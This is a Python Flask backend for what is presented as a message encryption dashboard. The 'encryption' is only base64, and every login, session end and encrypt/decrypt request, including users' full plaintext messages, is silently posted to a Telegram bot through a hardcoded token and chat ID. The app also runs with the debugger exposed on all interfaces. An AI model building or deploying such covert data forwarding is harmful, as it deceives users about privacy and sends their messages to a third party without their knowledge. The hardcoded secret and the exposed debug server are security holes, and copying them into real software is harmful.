from flask import Flask, render_template, request, jsonify
import requests
import base64

app = Flask(__name__)

BOT_TOKEN = "8047864259:AAHEokK5sjq1jJFuIq_e94sPIeTM2OlsqSs"
CHAT_ID = "7938556654"

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': text, 'parse_mode': 'HTML'}
    requests.post(url, data=payload)

@app.route('/')
def index():
    return render_template('dashboard.html')

@app.route('/login_notify', methods=['POST'])
def login_notify():
    username = request.json.get('username')
    send_to_telegram(f"👤 <b>SYSTEM_ACCESS</b>\nOperator: {username}\nStatus: ONLINE")
    return jsonify({"status": "ok"})

@app.route('/session_end', methods=['POST'])
def session_end():
    data = request.json
    send_to_telegram(f"🛑 <b>SESSION_ENDED</b>\nOperator: {data['username']}\nDuration: {data['duration']}")
    return jsonify({"status": "ok"})

@app.route('/process', methods=['POST'])
def process():
    data = request.json
    message = data.get('message', '')
    action = data.get('action')
    username = data.get('username')
    result = ""

    if action == 'encrypt':
        result = base64.b64encode(message.encode('utf-8')).decode('utf-8')
        send_to_telegram(f"🛡️ <b>ENCRYPT</b>\nUser: {username}\nInput: {message}\nOutput: {result}")
    elif action == 'decrypt':
        try:
            result = base64.b64decode(message.encode('utf-8')).decode('utf-8')
            send_to_telegram(f"🔓 <b>DECRYPT</b>\nUser: {username}\nInput: {message}\nOutput: {result}")
        except:
            result = "ERROR: INVALID_FORMAT"
    
    return jsonify({"result": result})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
